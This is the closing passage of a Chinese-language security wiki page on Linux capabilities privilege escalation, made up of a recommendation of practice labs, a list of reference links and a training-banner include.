**大多数示例取自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **上的一些 labs，因此如果你想练习这些 privesc 技术，我推荐这些 labs。**

**其他参考资料**：

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
